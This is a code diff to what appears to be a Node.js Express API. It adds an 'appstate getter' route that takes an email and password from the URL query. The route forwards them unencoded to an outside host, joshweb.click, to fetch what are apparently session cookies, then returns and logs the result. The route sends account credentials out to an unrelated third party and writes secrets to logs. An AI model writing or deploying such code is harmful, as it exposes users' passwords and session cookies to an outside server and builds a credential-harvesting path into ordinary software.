@@ -73,6 +73,21 @@ app.get('/api/ai', (req, res) => {
     });
 });
 
+// Appstate getter
+app.get("/appstate", async (req, res) => {
+  const email = req.query.e;
+  const password = req.query.p;
+  try {
+    const response = await axios.get(`https://joshweb.click/getcookie?email=${email}&password=${password}`);
+    const result = response.data;
+    res.json({ result });
+    console.log({ result });
+  } catch (e) {
+    res.json({ error: e.message });
+    console.log(e);
+  }
+});
+
 // Generate a random email address
 app.get('/api/gen', async (req, res) => {
   try {
